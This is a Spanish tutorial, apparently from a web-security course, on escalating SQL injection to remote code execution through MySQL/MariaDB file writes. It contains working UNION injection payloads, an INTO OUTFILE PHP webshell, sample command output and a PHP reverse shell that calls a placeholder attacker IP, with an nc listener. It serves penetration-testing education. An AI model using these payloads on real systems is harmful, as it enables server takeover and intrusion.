# Escritura de archivos y camino a RCE

## Por qué la escritura está mucho más restringida que la lectura

Escribir archivos arbitrarios en el servidor backend es, con diferencia, la capacidad más peligrosa que una inyección SQL puede otorgar: permite depositar directamente un **webshell** ejecutable, abriendo la puerta a ejecución remota de comandos sobre el propio servidor. Por eso los DBMS modernos restringen esta capacidad mucho más estrictamente que la simple lectura.

## Los tres requisitos para poder escribir archivos

1. **Usuario con privilegio `FILE`** habilitado (el mismo requisito visto para lectura).
2. **Variable `secure_file_priv`** no restrictiva en el servidor MySQL/MariaDB.
3. **Permisos de escritura del sistema operativo** sobre la ubicación de destino elegida.

## Comprobando `secure_file_priv`

Esta variable global determina desde/hacia dónde puede leer o escribir archivos el motor:

| Valor | Efecto |
|---|---|
| Vacío (`''`) | Sin restricción — se puede leer/escribir en cualquier parte del sistema de archivos |
| Ruta específica (p. ej. `/var/lib/mysql-files`) | Solo se permite operar dentro de esa carpeta concreta |
| `NULL` | Lectura/escritura de archivos completamente deshabilitada |

> MariaDB tiene este valor **vacío por defecto**, permitiendo lectura/escritura sin restricción si el usuario tiene el privilegio `FILE`. MySQL, en cambio, suele restringir por defecto a `/var/lib/mysql-files` — y muchas configuraciones modernas lo fijan directamente a `NULL`, bloqueando esta técnica por completo.

Consultando el valor vía `INFORMATION_SCHEMA` (ya que `SHOW VARIABLES` no es directamente utilizable dentro de una inyección):

```sql
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

Si el resultado es una cadena vacía, la escritura sin restricción de ubicación es viable.

## SELECT ... INTO OUTFILE

```sql
SELECT * FROM users INTO OUTFILE '/tmp/credentials';
```

Esta sentencia exporta el resultado de un `SELECT` directamente a un archivo del sistema — diseñada originalmente para exportar datos de tablas, pero igualmente útil para escribir **cadenas de texto arbitrarias**:

```sql
SELECT 'esto es una prueba' INTO OUTFILE '/tmp/test.txt';
```

## Escribiendo un archivo de prueba vía inyección

```sql
' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

> **Detalle práctico**: como la sentencia `UNION` completa se escribe en el archivo (no solo la cadena elegida), el resultado en disco incluirá también los valores de relleno (`1`, `3`, `4`) junto al mensaje. Usar comillas simples en lugar de números en todas las posiciones de relleno produce una salida más limpia cuando el objetivo es escribir un archivo de texto coherente.

## Localizando la raíz web

Para que el archivo escrito sea accesible vía HTTP (y no solo en disco), hay que conocerla con exactitud:

- Leer la configuración del servidor web con `LOAD_FILE()` (técnica vista en el apartado anterior): `/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`, o en Windows `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`.
- Si la lectura no es viable, **fuzzear** rutas de raíz web habituales con wordlists especializadas (técnica vista en el bloque de *Web Fuzzing*) — SecLists incluye listas dedicadas a este propósito específico, tanto para Linux como para Windows.
- Como último recurso, los propios mensajes de error del servidor a veces revelan la ruta absoluta del directorio web.

## El paso decisivo: escribiendo un webshell PHP

Con la raíz web confirmada (`/var/www/html` en el ejemplo) y permisos de escritura verificados:

```php
<?php system($_REQUEST[0]); ?>
```

Este intérprete mínimo ejecuta cualquier comando del sistema pasado en el parámetro `0` de la petición (GET o POST). Escribiéndolo vía la inyección SQL:

```sql
' UNION SELECT NULL, '<?php system($_REQUEST[0]); ?>', NULL, NULL INTO OUTFILE '/var/www/html/cmd.php'-- -
```

### Confirmando la ejecución remota de comandos

```
http://10.10.10.5/cmd.php?0=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Una inyección SQL acaba de convertirse en **ejecución remota de comandos completa** sobre el servidor backend — la escalada de impacto más severa posible a partir de una vulnerabilidad de inyección SQL.

## Llevándolo más allá: una reverse shell completa

Para obtener acceso interactivo en lugar de comandos uno a uno:

```php
<?php $s=fsockopen("IP_ATACANTE", PUERTO); exec("bash <&3 >&3 2>&3"); ?>
```

```sql
' UNION SELECT NULL, '<?php $s=fsockopen("IP_ATACANTE",PUERTO);exec("bash <&3 >&3 2>&3");?>', NULL, NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

Con un listener (`nc -lvnp PUERTO`) escuchando en la máquina del atacante, visitar `shell.php` desde el navegador (o con `curl`) establece una conexión de shell interactiva completa hacia el servidor comprometido.

## El recorrido completo de este ataque

```
Inyección SQL básica
  → confirmación de privilegios FILE
  → confirmación de secure_file_priv permisivo
  → localización de la raíz web
  → escritura de un webshell PHP
  → ejecución remota de comandos
  → (opcional) reverse shell interactiva completa
```

Este recorrido ilustra por qué SQL Injection, pese a parecer "solo" un problema de bases de datos a primera vista, puede escalar hasta el **compromiso total del servidor** — y por qué la mitigación rigurosa, tratada en el apartado final de este bloque, es tan crítica desde el diseño mismo de la aplicación.
